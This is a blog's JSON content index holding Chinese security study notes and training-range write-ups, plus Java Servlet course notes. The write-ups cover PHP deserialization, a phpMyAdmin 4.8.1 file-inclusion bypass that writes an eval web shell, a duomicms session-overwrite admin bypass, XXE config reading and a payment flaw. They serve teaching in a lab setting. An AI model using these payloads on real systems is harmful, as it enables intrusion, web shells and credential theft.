{"meta":{"title":"伏诗","subtitle":"","description":"","author":"伏诗","url":"http://wxnsoul.github.io","root":"/"},"pages":[{"title":"categories","text":"","path":"categories/index.html","date":"03-31","excerpt":""},{"title":"about","text":"自己的急性子需要改改啦~~blog就是一个很好的选择 平平凡凡普通人一枚,尽自己所能去美好的活着 新的一年,一定要成功减肥,吼吼吼","path":"about/index.html","date":"03-31","excerpt":""},{"title":"tags","text":"","path":"tags/index.html","date":"03-31","excerpt":""}],"posts":[{"title":"序列化于反序列化--zkaq靶场","text":"#代码审计 第一行可以得知flag在./flag.php中访问一下什么也没有,检查源代码也没有.这说明服务器端的php代码并没有输出值.需要用到show_resource才能看到flagHighlight_file(,true)就是确认开启代码高亮引用了一个魔术方法toString,检测到把类当初字符串输出后就会会把readme.txt和$this-&gt;source拼接在一起输出.源码中赋值的是FILE__所以这个页面会输出源码,如果我们把source的赋值变成flag.php把岂不是也能输出flag了?而全文就只有一个输出类的地方似乎就是检测get传参的那边.他会把当前文件的路径名传给resource变量然后输出.但其实还有一个输出的点,那就是她就相当于echo的缩写源码是这么写的)他会把todos数组遍历输出.在cookie传参的时候会有用到todos,会把m反序列化之后传给todos,但是这时候的todos并不是数组,所以只要强行给m值加上一个中括号,这样todos就变成了一个数组变量S是已经无法修改了只能是赋值FILE,所以得在另外一个输出点下手.Cookie判断里,substr($a,32)和substr($a,0,32)前者是从$a第32位之后开始取值,后者是取值前32.如果h=md5(m)就会给todos赋值,c是我们可以控制的,这说明c应该是由md5(m).m构成,这样就变成了md5(m)==md5(m),而m会被反序列化,说明c的后32位应该先序列化.只要把我们想要的flag.php序列化,然后给m,todos输出就会得到源码.但是todos必须是数组才会输出,所以得给readme对象再加一个[],然后再去序列化我们先得到序列化,得到a:1:{i:0;O:6:&quot;readme&quot;:1:{s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;}}这里的a指数组,i指第几个元素,0就是第零个这里的序列化是非常的关键的!!!必须使用readme类,source变量!!!这样反序列化之后就相当于给这个类的source复制成自己想要的了! 的时候就能输出源码了因为只有readme类里面才有这个__toString函数!这个函数也只输出source变量的源码!我们把序列化之后的字符串md5加密,得到e2d4f7dcc43ee1db7f69e76303d0105c把他们拼接在一起得到e2d4f7dcc43ee1db7f69e76303d0105ca:1:{i:0;O:6:&quot;readme&quot;:1:{s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;}},todos就能执行foreach,在cookie中被反序列化后就是一个有着信息的数组类,在foreach中输出.就会触发toString.这边有个小提示,cookie传参和get传参一样,是会先进行url编码的,所以得先编码再传参cookie,用burp抓包修改.e2d4f7dcc43ee1db7f69e76303d0105ca%3a1%3a%7bi%3a0%3bO%3a6%3a%22readme%22%3a1%3a%7bs%3a6%3a%22source%22%3bs%3a8%3a%22flag.php%22%3b%7d%7d)得到cookie.一开始犯了个错误,就是先md5加密拼接后才加得[],这样[]就变成字符串了,还占位置","path":"2020/04/11/序列化于反序列化-zkaq靶场/","date":"04-11","excerpt":"","tags":[{"name":"序列化与反序列化","slug":"序列化与反序列化","permalink":"http://wxnsoul.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"序列化于反序列化","text":"什么是序列化? 序列化(seralize)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。[将状态信息保存为字符串]简单的理解:将PHP中对象、类、数组、变量、匿名函数等，转化为字符串，方便保存到数据库或者文件中,内存中,数据库中 #什么是反序列化? 反序列化即逆过程，由字节流还原成对象。Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectInputStream类的readObject()方法用于反序列化。下面是将字符串对象先进行序列化，存储到本地文件，然后再通过反序列化进行恢复问题在于，如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。所以这个问题的根源在于类ObjectInputStream在反序列化时，没有对生成的对象的类型做限制；假若反序列化可以设置Java类型的白名单，那么问题的影响就小了很多。反序列化问题由来已久，且并非Java语言特有，在其他语言例如PHP和Python中也有相似的问题。 #函数介绍 FILE一开始没有everedit不知道是双下划线,这个变量就是储存当前文件的路径的Show_source这个是用于输出当前文件的源码,CTF常用Serialize函数这边var $test的var可以理解为访问控制符,和protect,public差不多,这算是默认权限.理解: string(35)就是指序列化之后的字符串一共长35O代表object,对象是chy,长为31代表对象里一个变量{}表示类里面的东西,s表示字符串,整句话就是对象里面一个变量键长为4,是test,值长为3,是123Unserialize函数使用反序列化函数的时候有一个注意点,需要保证大致的框架还是有的,就是说对象还是要写的,里面的数量也要正确,但是里面的细节可以被你偷偷篡改尽量多使用var_dump,echo输出是很局限的,只能输出字符串Print_r函数输出非字符串 #魔术方法 双下划线,90%是魔术方法就是当满足一定条件时就会自动执行的函数,上面的class1变量被创建时就会自动执行construct函数输出,然后程序结束后就会自动销毁,调用destruct,如果使用unserialize就是自动调用wakeuptoString函数__toString() 是魔术方法的一种，具体用途是当一个对象被当作字符串对待的时候，会触发这个魔术方法 以下说明摘自PHP官方手册public string __toString ( void )__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。Warning不能在 __toString() 方法中抛出异常。这么做会导致致命错误。输出字符串时是不会触发的,把类当字符串输出才会触发 #补充 有一个特殊得输出方式,相当于echo&lt;?=$todo?&gt;就相当于echo $todo #靶场实战 传送门:","path":"2020/04/11/序列化于反序列化/","date":"04-11","excerpt":"","tags":[{"name":"序列化与反序列化","slug":"序列化与反序列化","permalink":"http://wxnsoul.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"本地包含与远程包含--zkaq靶场","text":"这边找了半天终于找来了phpmyadmin4.8.1的源码,之前一直以为是phpmywid导致找不着… #代码审计 因为用到的函数都包含include,require所以直接全局检索这两个关键词即可)所有的并不是都需要去查看,像1,2,3这些都已经被死死的规定好了变量内容,就不需要去看了,像第八个可以自己控制变量target的输入,就可以去查看可以看到要满足这么多条件才可以执行include现在解释下这些条件 变量target不能为空 变量target得是字符串 不能是index开头(因为有!) 不能再黑名单中全文定位后后现黑名单就包括这两个 这是一个调用类的方法定位函数查到找在core.php中,我们只需要看如何才能返回true就可以,因为第五个条件要成立. #分析 )这就是给变量白名单赋值goto_whitelist里面的字符串)这个返回true,但是必须要在白名单里.本地包含肯定是不行的,本地文件里不会有木马.继续往下找(如果我疯狂上传然后疯狂传参去访问会不会可以出现?像条件竞争那样???)这个就是查找?之前的字符串返回给变量page. Strops查找?第一次返回的位置,substr截取哪儿到哪儿.所以如果我们输入db_sql.php?/../是可以绕过白名单的但是incude里不能有?,,所以凉凉换下一个这个是url解码,这里有个小知识,get传参得到的字符串是会被url解码一次的,因为发送数据包的时候会被编码一次 Get传参事先解码一次把%25变成%然后urldeocde又把%27解码成’这次是先解码,然后去截取匹配这样我们就可以绕过?, 写成db_sql.php%253f/../,这就是第五个条件 测试 在index目录下传参target=db_sql.php%253f/../1.a(1.a)中式phpinfo(),这样就是本地包含了,可以直接执行phpinfo.但是服务器那边是不会有1.a的,需要自己去上传,然后再包含.)这边爆破登陆后台,发现并不可以上传文件,但是可以对数据库文件执行操作.数据库的文件是会被保存在服务器的,所以可以自己创建一个数据库,创建一个表,在里面写入一个一句话木马)点击变量,可以看到数据库的存储路径!)这边创建了一个test库,zkaq表,里面的值是一句话木马.测试一下是否可以包含?target=db_sql.php%253f/../../../../../phpStudy/MySQL/data/test/zkaq.frm&amp;a=phpinfo();)成功包含了.注;创建的zkaq表在服务器端保存得就是zkaq.frm.测试成功了,那我们就可以利用版含漏洞去写一个马.首先访问8.php(随便写的,没有这个文件就好,没有的话就去上传这个文件马)没有,然后去执行包含代码target=db_sql.php%253f/../../../../../phpStudy/MySQL/data/test/zkaq.frm&amp;a=&lt;?php file_put_contents(&#39;8.php&#39;,&#39;&lt;?php @eval($_REQUEST[a])?&gt;&#39;);?&gt;; 似乎执行成功了,访问8.php","path":"2020/04/11/本地包含与远程包含-zkaq靶场/","date":"04-11","excerpt":"","tags":[{"name":"本地包含于远程包含","slug":"本地包含于远程包含","permalink":"http://wxnsoul.github.io/tags/%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E4%BA%8E%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/"}]},{"title":"本地包含与远程包含","text":"#概念 本地文件包含包含服务器上的资源.远程文件包含通过HTTP协议包含其他地方的资源攻击者利用包含的特性，加上应用本身对文件(包含)控制不严格，最终造成攻击者进行任意文件包含。(注:包含的文件会被当成脚本文件来解析)一句话来说就是:文件包含并不属于漏洞，但是，由于对包含进来的文件不可控，导致了文件包含漏洞的产生。注:包含文件很有用，可以简化代码文件包含分为本地和远程文件包含(需要allow_url_ include = 0n)本地文件包含LFI远程文件包含RFI(面试的时候说英文) 举例 举个例子,如果你进入后台会需要验证你的身份,权限.但是是每个页面都需要写验证代码吗?这样就很冗余.此时就可以写一个check.php然后其余页面取包含它即可.文件包含函数里面的东西都必须当作代码来执行.文件包含,只要包含了,不管任何后缀都会当作php执行 #函数解析 这里用到一个file_put_contents函数,执行 &lt;?php file_put_contents(&#39;8.php&#39;,&#39;&lt;?php eval($_REQUEST[a])?&gt;&#39;);?&gt;这段代码,就会生成一个个8.php里面包含着一句话木马.这就是xxe里面的炮台,和条件竞争里的代码 Include函数如果没有包含的文件也不影响代码执行.还会把路径爆出来.. Require函数 Include_once Require_once这两个函数和上面的区别就是被包含的文件组多只能是一次不会多次执行,如果不知道路径可以使用....多写几个最多退到根目录 刚刚都是本地包含,如果要用远程包含,那么一定要开启allow_url_include在php.ini配置文件中找到改成on,就可以取包含公网上的东西了.其实利用SMB服务也可以讲本地包含变成远程文件包含 #靶场实战 传送门:","path":"2020/04/11/本地包含与远程包含/","date":"04-11","excerpt":"","tags":[{"name":"本地包含于远程包含","slug":"本地包含于远程包含","permalink":"http://wxnsoul.github.io/tags/%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E4%BA%8E%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/"}]},{"title":"变量覆盖--zkaq靶场","text":"#代码审计 首先找来了duomicms源码,然后使用代码审计工具打开,审计匹配$$,可以再common.php中发现)这里相当于任意变量注册.定位函数查找RunMagicQuotes意思就是有没有开魔术引号,开了就直接用,没有开就用addslashes加一个有了任意变量注册,就需要走到那一步,就需要避免前面的exit和die退出Common文件,是通用的意思,就是说其余会有很多文件都去包含这个文件取使用)就比如admin登录页面就包含了common.php,这里的duomi_INC我们不知道是什么,但是可以去使用特殊手段测试,毕竟源码在我们手上)可以看出其实是个路径)再看duomiphp下面有一个check_admin.php可以给用户设置session(一个特殊的变量)https://blog.csdn.net/weixin_42217767/article/details/92760353)Session：记录一系列状态.Session与cookie功能效果相同。Session与Cookie的区别在于Session是记录在服务端的，而Cookie是记录在客户端的。解释session：当访问服务器否个网页的时候，会在服务器端的内存里开辟一块内存，这块内存就叫做session，而这个内存是跟浏览器关联在一起的。这个浏览器指的是浏览器窗口，或者是浏览器的子窗口，意思就是，只允许当前这个session对应的浏览器访问，就算是在同一个机器上新启的浏览器也是无法访问的。而另外一个浏览器也需要记录session的话，就会再启一个属于自己的session.所以我们可以连续访问而不用一直输入用户信息但是,当我们使用变量取覆盖一个session之后,这样就是对我的cookie进行了一次权限的赋值.要使用session,必须要使用session_start全局搜索可以发现在comment这个文件下同时有session_start和加载了变量覆盖的那个php!interface/comment.php?_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin id]=1&amp;_SESSION[duomi_admin_name]=admid这时候这样传参就会用于管理员的权限)为什么要给1呢?因为审计之后发现1的时候是系统管理员权限)为什么是这三个参数?是因为文中是对这三个参数赋值判断的 #测试靶场 )现在是需要登陆的,但是当我用变量覆盖session给自己一个管理员权限以后)interface/comment.php?_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_id]=1&amp;_SESSION[duomi_admin_name]=admin)再次刷新就直接进入后台了Flag在微信公众号这里flag{nOthIng_fIag}","path":"2020/04/11/变量覆盖-zkaq靶场/","date":"04-11","excerpt":"","tags":[{"name":"变量覆盖","slug":"变量覆盖","permalink":"http://wxnsoul.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"}]},{"title":"变量覆盖","text":"什么是变量覆盖 变量覆盖指的是可以用我们的传参值替换程序原有的变量值 怎么去寻找变量覆盖? 经常导致变量覆盖漏洞场景有: $$使用不当，extract() 函数使用不当，parse_ str() 函数使用不当import_ request_variables() 使用不当，开启了全局变量注册(现在已经几乎不会出现了)等。变量覆盖漏洞有的时候可以直接让我们获取Webshell,拿到服务器的权限 简单实例 )访问页面会输出123这样就会输出124,这就是一个标准的变量覆盖 函数解析Extract函数 extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。&lt;?php $a = &quot;Original&quot;; &lt;br&gt; $my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;); &lt;br&gt; extract($my_array); &lt;br&gt; echo &quot;\\$a = $a; \\$b = $b; \\$c = $c&quot;; &lt;br&gt; ?&gt;输出:$a = Cat; $b = Dog; $c = Horse,,此时原本的a就被覆盖了Parse_str()函数 把查询字符串解析到变量中 会输出peter 43 ![mark](http://q85br28lq.bkt.clouddn.com/blog/20200411/tJjXSMAmUscK.png?imageslim)![mark](http://q85br28lq.bkt.clouddn.com/blog/20200411/pUnokXkrbdtj.png?imageslim) 这句话的意思就是把变量_COOOKIE,_POST,_GET整合到一起赋值给变量_request,变量_request中就包含了这三种传参方式得参数名和参数值$$request=$($requset)=$( _COOOKIE+_POST+_GET)=$ _COOOKIE+$_POST+$_GET![mark](http://q85br28lq.bkt.clouddn.com/blog/20200411/3bNIAk4sCHM6.png?imageslim)这句话的意思就是把request变量中的键和值分离.三种传参方式得参数名变为键,参数值变为值![mark](http://q85br28lq.bkt.clouddn.com/blog/20200411/Rb5mnxnf77cd.png?imageslim)这句话就是把所有的键变成一个变量,然后把对应的值使用魔术引号后赋值给他们.分离后把对应得值再赋给他们 其实就是用户三种方式传入的变量和值都会被拿出来,传入得变量变成一个键后在变为变量,然后赋值 #代码审计工具 可以使用审计插件中的数据库监控,操作过后数据库ddl语句会留下也可以使用自动审计,再加上系统配置中的规则,取扫描可能存在的漏洞(但是误报率90以上))寻找$$)文字查找功能)函数定位功能 #靶场实战 传送门:","path":"2020/04/11/变量覆盖/","date":"04-11","excerpt":"","tags":[{"name":"变量覆盖","slug":"变量覆盖","permalink":"http://wxnsoul.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"}]},{"title":"XXE实体注入","text":"XXE是什么 XXE = XML External Entity 即外部实体，从安全角度理解成XMLExternal Entity attack XML 外部实体注入攻击DTD就是定义XML变量的,这里是可以远程调用得,第三部分就是实体部分 XML指可扩展标记语言(EXtensible Markup Language) XML是一种标记语言，很类似HTML XML的设计宗旨是传输数据，而非显示数据 XML标签没有被预定义。您需要自行定义标签。(就比如说没有像html里面的h1这样的预定义标签,要用得自己定义) XML被设计为具有自我描述性。 XML是W3C的推荐标准 特点: XML仅仅是纯文本，他不会做任何事情。 XML可以自己发明标签(允许定义自己的标签和文档结构) XML无所不在。XML 是各种应用程序之间进行数据传输的最常用的工具，并且在信息存储和描述领域变得越来越流行。 说到底,xml就是一个储存数据的XXE注入也是注入,所以也必须满足两点:1.用户可以控制输入2.会被当作代码执行 原理 )这句话的意思就是定义一个变量file,值就是用system去配合php伪协议去读取1.txt的内容后再经过base64加密.这其中SYSTEM是最主要的为什么xml会被调用呢?因为像Java,php能去把xml变为自己的一个对象然后执行其中simplexml_load_string这个函数是将字符串转换为php对象,然后输出对象的键和元素.这个需要特别注意,一般php中只有这个会产生xxe注入但是很多时候后端语言解析了XML后其实并不会给你输出，难道这样子我们就不能进行XXE了?就可以抵挡住我们的脚步了吗?不，，我们可以使用一个类似与接受平台一样的接受器，XML读取数据然后发送到接收的平台，然后接收平台存储，我们再去接收平台查看就可以了。感觉是不是像是反弹注入的感觉~)大致过程如下: 防御方法 方案一.使用开发语言提供的禁用外部实体的方法PHP:libxml_ disable entity. loader(true);其他语言:https://www.owasp.org/index.php/XML_ External Entity (XXE)_ Prevention Cheat_ Sheet方案二、过滤用户提交的XML数据,关键词:SYSTEM和PUBLIC. 总结 `&lt; ! DOCTYPE ANY [ %remote; %send; ] &gt;`这段代码就已经包含了访问想要的conn.php文件,然后直接访问我们的主机里的1.xml,就记录下了conn.php的信息.所以虽说大致过程有四步但是一句代码就执行完了 靶场实战 传送门:https://wxnsoul.github.io/2020/04/09/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/09/XXE实体注入/","date":"04-09","excerpt":"","tags":[{"name":"XXE","slug":"XXE","permalink":"http://wxnsoul.github.io/tags/XXE/"}]},{"title":"XXE实体注入--zkaq靶场","text":"前言 这题是一个s-cms搭建的靶场,来源于18年微信被爆出的xxe漏洞,我在网上找到了源码并且开始测试.题目的tips里面为我们搭建了炮台,我个人还是打算自己搭建一个防止以后需要用到. 代码审计 )查找到有simplexml_load_string这个函数用于将xml转换为php对象,就是证明确实可能存在xxe漏洞,加上这个postArr这个变量根本没有被过滤过,所以很有可能存在漏洞而postArr是由file_get_contents()这个函数获取得,去测试一下是什么意思)但是访问虚拟机后却没有反应原因是 enctype中不能带有form等(实际自己测试中并没有在这些)(enctype是burp抓包里面的内容))Burp抓包删除后传入任意字符)都会被输出)注意观察上图最上方有一个exit函数,所以得避免进入到exit得条件里并且又能够进入到带有simplexml_load_string函数得if判断里可以看到这个signature是通过传参得来的,且不能为空,而echostr这个条件必须为空 测试 知道这些后进入靶场开始测试,首先进入倒weixin,抓包传参)把get传参改为post)在repeater界面发送,可以看到如果这个xxe的传参是错误的,就会说simple_load_string是错误的,找不着,但也代表着成功进入了if分支这里再有一个知识点,一般cms都会有一个配置文件储存着数据库的连接地址和账号密码,不然登录的时候怎么验证呢?就比如s-cms的数据库配置文件.)在这个conn文件夹里,别的cms可能在database文件里面啊啥的啥的,所以我们就可以通过xxe来读取文件我们看这个报错就可以得知我们现在的位置,就可以去访问C盘下的connC:\\phpStudy\\scms\\conn\\conn.php &lt; ! DOCTYPE ANY [ %remote; %send; ] &gt;)原页面产生了报错)但是访问3.txt其实数据已经被返回出来了,base64解密之后)就已经得到了数据库账号密码)访问登录页面)成功登录)看到敏感的admin和pwd,应该是个md5加密)就得到了管理员的账号密码)根据提示就是这个过关","path":"2020/04/09/XXE实体注入-zkaq靶场/","date":"04-09","excerpt":"","tags":[{"name":"XXE","slug":"XXE","permalink":"http://wxnsoul.github.io/tags/XXE/"}]},{"title":"支付漏洞--zkaq靶场","text":"这题一上来就能看出是个cms建站的,然后注册个账号,登录..看见有商品支付,,自己尝试抓包,但是看了很久没有找到price,只有quality数量,于是乎改了一波数量为-1,爆出了错误,但是查看余额却发现自己的钱变多了..)试了用多出的钱去买东西也可以.但是找不到flag…后来才知道当钱足够多时就会出flag…)其实这题连抓包都不需要,,直接填写数量-1111都可以,前端检测都没有的","path":"2020/04/09/支付漏洞-zkaq靶场/","date":"04-09","excerpt":"","tags":[{"name":"支付漏洞","slug":"支付漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"}]},{"title":"支付漏洞","text":"一.快捷支付原理 第一种浏览器跳转是比较古老的,现在很少用,直接抓包就可以修改支付漏洞不需要代码审计,但是一定要有发散思维!!!!!!!就是不走寻常路二.常见支付漏洞 Burp修改确认金额,修改数,甚至于修改优惠卷,积分总之一切于利益挂钩的东西都可以去尝试三.支付漏洞如何挖掘 拿了几个学长的实战做例子,通过修改参数就实现了支付漏洞 四.防御方法 后端检查每一项值，包括支付状态。 校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量 与第三方支付平台检查，实际支付的金额是否与订单金额一致。 支付参数进行MD5加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题 金额超过阈(yu)值，|进行人工审核 知识普及 PC的漏洞在app上也都能找到,用模拟器即可,相关操作去搜索文章 二维码不是什么神奇的东西,只是把东西转换成二维码了而已举例:用二维码生成器生成一个二维码保存去解码就可以获得生成时候输入的东西,所以不要瞎扫二维码就是可能会把恶意网站的链接给做成二维码而已 一定要有一双善于发现的眼睛!!!!!!!!生活要善于发现美,网站要善于发现漏洞,,,发散思维!!!! 靶场实战 传送门:https://wxnsoul.github.io/2020/04/09/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/09/支付漏洞/","date":"04-09","excerpt":"","tags":[{"name":"支付漏洞","slug":"支付漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"}]},{"title":"Servlet&HTTP&Request笔记","text":"今日内容：1. Servlet 2. HTTP协议 3. RequestServlet：1. 概念 2. 步骤 3. 执行原理 4. 生命周期 5. Servlet3.0 注解配置 6. Servlet的体系结构 Servlet -- 接口 | GenericServlet -- 抽象类 | HttpServlet -- 抽象类 * GenericServlet：将Servlet接口中其他的方法做了默认空实现，只将service()方法作为抽象 * 将来定义Servlet类时，可以继承GenericServlet，实现service()方法即可 * HttpServlet：对http协议的一种封装，简化操作 1. 定义类继承HttpServlet 2. 复写doGet/doPost方法 7. Servlet相关配置 1. urlpartten:Servlet访问路径 1. 一个Servlet可以定义多个访问路径 ： @WebServlet({&quot;/d4&quot;,&quot;/dd4&quot;,&quot;/ddd4&quot;}) 2. 路径定义规则： 1. /xxx：路径匹配 2. /xxx/xxx:多层路径，目录结构 3. *.do：扩展名匹配HTTP：* 概念：Hyper Text Transfer Protocol 超文本传输协议 * 传输协议：定义了，客户端和服务器端通信时，发送数据的格式 * 特点： 1. 基于TCP/IP的高级协议 2. 默认端口号:80 3. 基于请求/响应模型的:一次请求对应一次响应 4. 无状态的：每次请求之间相互独立，不能交互数据 * 历史版本： * 1.0：每一次请求响应都会建立新的连接 * 1.1：复用连接 * 请求消息数据格式 1. 请求行 请求方式 请求url 请求协议/版本 GET /login.html HTTP/1.1 * 请求方式： * HTTP协议有7中请求方式，常用的有2种 * GET： 1. 请求参数在请求行中，在url后。 2. 请求的url长度有限制的 3. 不太安全 * POST： 1. 请求参数在请求体中 2. 请求的url长度没有限制的 3. 相对安全 2. 请求头：客户端浏览器告诉服务器一些信息 请求头名称: 请求头值 * 常见的请求头： 1. User-Agent：浏览器告诉服务器，我访问你使用的浏览器版本信息 * 可以在服务器端获取该头的信息，解决浏览器的兼容性问题 2. Referer：http://localhost/login.html * 告诉服务器，我(当前请求)从哪里来？ * 作用： 1. 防盗链： 2. 统计工作： 3. 请求空行 空行，就是用于分割POST请求的请求头，和请求体的。 4. 请求体(正文)： * 封装POST请求消息的请求参数的 * 字符串格式： POST /login.html HTTP/1.1 //请求行 Host: localhost//请求头 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://localhost/login.html Connection: keep-alive Upgrade-Insecure-Requests: 1 //请求空行 username=zhangsan //请求体 * 响应消息数据格式Request：1. request对象和response对象的原理 1. request和response对象是由服务器创建的。我们来使用它们 2. request对象是来获取请求消息，response对象是来设置响应消息 2. request对象继承体系结构： ServletRequest -- 接口 | 继承 HttpServletRequest -- 接口 | 实现 org.apache.catalina.connector.RequestFacade 类(tomcat) 3. request功能： 1. 获取请求消息数据 1. 获取请求行数据 * GET /day14/demo1?name=zhangsan HTTP/1.1 * 方法： 1. 获取请求方式 ：GET * String getMethod() 2. (*)获取虚拟目录：/day14 * String getContextPath() 3. 获取Servlet路径: /demo1 * String getServletPath() 4. 获取get方式请求参数：name=zhangsan * String getQueryString() 5. (*)获取请求URI：/day14/demo1 * String getRequestURI(): /day14/demo1 * StringBuffer getRequestURL() :http://localhost/day14/demo1 * URL:统一资源定位符 ： http://localhost/day14/demo1 中华人民共和国 * URI：统一资源标识符 : /day14/demo1 共和国 6. 获取协议及版本：HTTP/1.1 * String getProtocol() 7. 获取客户机的IP地址： * String getRemoteAddr() 2. 获取请求头数据 * 方法： * (*)String getHeader(String name):通过请求头的名称获取请求头的值 * Enumeration&lt;String&gt; getHeaderNames():获取所有的请求头名称 3. 获取请求体数据: * 请求体：只有POST请求方式，才有请求体，在请求体中封装了POST请求的请求参数 * 步骤： 1. 获取流对象 * BufferedReader getReader()：获取字符输入流，只能操作字符数据 * ServletInputStream getInputStream()：获取字节输入流，可以操作所有类型数据 * 在文件上传知识点后讲解 2. 再从流对象中拿数据 2. 其他功能： 1. 获取请求参数通用方式：不论get还是post请求方式都可以使用下列方法来获取请求参数 1. String getParameter(String name):根据参数名称获取参数值 username=zs&amp;password=123 2. String[] getParameterValues(String name):根据参数名称获取参数值的数组 hobby=xx&amp;hobby=game,多用于复选框 3. Enumeration&lt;String&gt; getParameterNames():获取所有请求的参数名称 4. Map&lt;String,String[]&gt; getParameterMap():获取所有参数的map集合 * 中文乱码问题： * get方式：tomcat 8 已经将get方式乱码问题解决了 * post方式：会乱码 * 解决：在获取参数前，设置request的编码request.setCharacterEncoding(&quot;utf-8&quot;); 2. 请求转发：一种在服务器内部的资源跳转方式 1. 步骤： 1. 通过request对象获取请求转发器对象：RequestDispatcher getRequestDispatcher(String path) 2. 使用RequestDispatcher对象来进行转发：forward(ServletRequest request, ServletResponse response) 2. 特点： 1. 浏览器地址栏路径不发生变化 2. 只能转发到当前服务器内部资源中。 3. 转发是一次请求 3. 共享数据： * 域对象：一个有作用范围的对象，可以在范围内共享数据 * request域：代表一次请求的范围，一般用于请求转发的多个资源中共享数据 * 方法： 1. void setAttribute(String name,Object obj):存储数据 2. Object getAttitude(String name):通过键获取值 3. void removeAttribute(String name):通过键移除键值对 4. 获取ServletContext： * ServletContext getServletContext() 案例：用户登录* 用户登录案例需求： 1.编写login.html登录页面 username &amp; password 两个输入框 2.使用Druid数据库连接池技术,操作mysql，day14数据库中user表 3.使用JdbcTemplate技术封装JDBC 4.登录成功跳转到SuccessServlet展示：登录成功！用户名,欢迎您 5.登录失败跳转到FailServlet展示：登录失败，用户名或密码错误 * 分析 * 开发步骤 1. 创建项目，导入html页面，配置文件，jar包 2. 创建数据库环境 CREATE DATABASE day14; USE day14; CREATE TABLE USER( id INT PRIMARY KEY AUTO_INCREMENT, username VARCHAR(32) UNIQUE NOT NULL, PASSWORD VARCHAR(32) NOT NULL ); 3. 创建包cn.itcast.domain,创建类User package cn.itcast.domain; /** * 用户的实体类 */ public class User { private int id; private String username; private String password; public int getId() { return id; } public void setId(int id) { this.id = id; } public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } public String getPassword() { return password; } public void setPassword(String password) { this.password = password; } @Override public String toString() { return &quot;User{&quot; + &quot;id=&quot; + id + &quot;, username=&apos;&quot; + username + &apos;\\&apos;&apos; + &quot;, password=&apos;&quot; + password + &apos;\\&apos;&apos; + &apos;}&apos;; } } 4. 创建包cn.itcast.util,编写工具类JDBCUtils package cn.itcast.util; import com.alibaba.druid.pool.DruidDataSourceFactory; import javax.sql.DataSource; import javax.xml.crypto.Data; import java.io.IOException; import java.io.InputStream; import java.sql.Connection; import java.sql.SQLException; import java.util.Properties; /** * JDBC工具类 使用Durid连接池 */ public class JDBCUtils { private static DataSource ds ; static { try { //1.加载配置文件 Properties pro = new Properties(); //使用ClassLoader加载配置文件，获取字节输入流 InputStream is = JDBCUtils.class.getClassLoader().getResourceAsStream(&quot;druid.properties&quot;); pro.load(is); //2.初始化连接池对象 ds = DruidDataSourceFactory.createDataSource(pro); } catch (IOException e) { e.printStackTrace(); } catch (Exception e) { e.printStackTrace(); } } /** * 获取连接池对象 */ public static DataSource getDataSource(){ return ds; } /** * 获取连接Connection对象 */ public static Connection getConnection() throws SQLException { return ds.getConnection(); } } 5. 创建包cn.itcast.dao,创建类UserDao,提供login方法 package cn.itcast.dao; import cn.itcast.domain.User; import cn.itcast.util.JDBCUtils; import org.springframework.dao.DataAccessException; import org.springframework.jdbc.core.BeanPropertyRowMapper; import org.springframework.jdbc.core.JdbcTemplate; /** * 操作数据库中User表的类 */ public class UserDao { //声明JDBCTemplate对象共用 private JdbcTemplate template = new JdbcTemplate(JDBCUtils.getDataSource()); /** * 登录方法 * @param loginUser 只有用户名和密码 * @return user包含用户全部数据,没有查询到，返回null */ public User login(User loginUser){ try { //1.编写sql String sql = &quot;select * from user where username = ? and password = ?&quot;; //2.调用query方法 User user = template.queryForObject(sql, new BeanPropertyRowMapper&lt;User&gt;(User.class), loginUser.getUsername(), loginUser.getPassword()); return user; } catch (DataAccessException e) { e.printStackTrace();//记录日志 return null; } } } 6. 编写cn.itcast.web.servlet.LoginServlet类 package cn.itcast.web.servlet; import cn.itcast.dao.UserDao; import cn.itcast.domain.User; import javax.servlet.ServletException; import 